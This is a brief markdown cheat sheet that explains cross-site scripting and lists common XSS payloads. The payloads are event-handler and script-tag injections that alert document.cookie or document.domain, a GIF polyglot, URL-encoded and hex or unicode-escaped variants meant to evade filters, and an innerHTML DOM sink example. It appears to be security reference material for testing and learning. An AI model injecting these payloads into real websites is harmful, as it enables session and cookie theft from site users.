# 🛡️ Cross-Site Scripting (XSS)  

## 🔹 What is XSS?  
Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious scripts into trusted websites.  

---

## 🚀 **Common XSS Payloads**  

### ✅ **Basic XSS Payloads**  
```html
<img src=x onerror=alert(100)>
<svg onload=alert(1)>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<script>alert(document.cookie)</script>
"><script>alert(document.domain)</script>
'"><script>alert("XSS")</script>

GIF89a/<svg/onload=alert(1)>/=alert(document.domain)//;
je2f7'%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3ebr9lq
enypcpv"onload="alert(1)"nnyfb

<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>

document.write("<img src=x onerror=alert(1)>")
var XSS = document.URL;
document.body.innerHTML = XSS;


